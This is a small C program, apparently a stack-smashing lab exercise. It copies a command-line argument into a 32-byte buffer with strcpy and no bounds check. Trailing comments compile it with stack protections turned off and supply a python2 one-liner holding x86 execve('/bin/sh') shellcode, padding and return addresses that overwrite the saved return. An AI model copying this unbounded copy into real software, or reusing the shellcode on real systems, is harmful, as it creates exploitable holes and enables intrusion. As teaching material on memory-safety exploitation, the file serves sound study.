#include <string.h>
#include <unistd.h>

int sw = 30;
int func(char * argv)
{
    // while (sw) {
    //     sleep(1);
    //     sw--;
    // }
    char buffer[32];
    strcpy(buffer, argv);
    return 0;
}

int main(int argc, char * argv[])
{
    func(argv[1]);
    return 0;
}

// gcc -o mys mystack.c -z execstack -fno-stack-protector -g -O0 -m32
// ./mys $(python2 -c 'print ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" +"A"*7 + "A"*8 + "\xa8\xce\xff\xff" + "\x80\xce\xff\xff")')
